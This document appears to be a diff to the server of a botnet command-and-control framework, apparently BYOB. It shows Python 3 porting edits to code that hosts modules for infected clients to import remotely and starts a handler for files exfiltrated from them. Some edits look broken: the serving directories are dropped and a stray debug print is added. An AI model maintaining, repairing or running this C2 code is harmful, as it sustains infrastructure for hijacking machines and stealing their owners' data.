@@ -20,7 +20,7 @@ import threading
 import subprocess
 import collections
 
-http_serv_mod = "SimpleHTTPServer"
+http_serv_mod = "http.server"
 if sys.version_info[0] > 2:
     http_serv_mod = "http.server"
     sys.path.append('core')
@@ -42,7 +42,7 @@ except ImportError:
     sys.exit("Error: missing package 'colorama' is required")
 
 try:
-    raw_input          # Python 2
+    raw_input=input         # Python 2
 except NameError:
     raw_input = input  # Python 3
 
@@ -132,10 +132,11 @@ def main():
     globals()['debug'] = options.debug
 
     # host Python packages on C2 port + 2 (for clients to remotely import)
-    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+    globals()['package_handler'] = subprocess.Popen('python3 -m http.server {}'.format(options.port + 2))
 
     # host BYOB modules on C2 port + 1 (for clients to remotely import)
-    globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+    print(sys.executable)
+    globals()['module_handler'] = subprocess.Popen('python3 -m http.server {}'.format(options.port + 1))
 
     # run simple HTTP POST request handler on C2 port + 3 to handle incoming uploads of exfiltrated files
     globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
@@ -354,13 +355,13 @@ class C2():
         }
 
         try:
-            import readline
+            import gnureadline
         except ImportError:
             util.log("Warning: missing package 'readline' is required for tab-completion")
         else:
             import rlcompleter
-            readline.parse_and_bind("tab: complete")
-            readline.set_completer(self._completer)
+            gnureadline.parse_and_bind("tab: complete")
+            gnureadline.set_completer(self._completer)
 
     def _print(self, info):
         lock = self.current_session._lock if self.current_session else self._lock
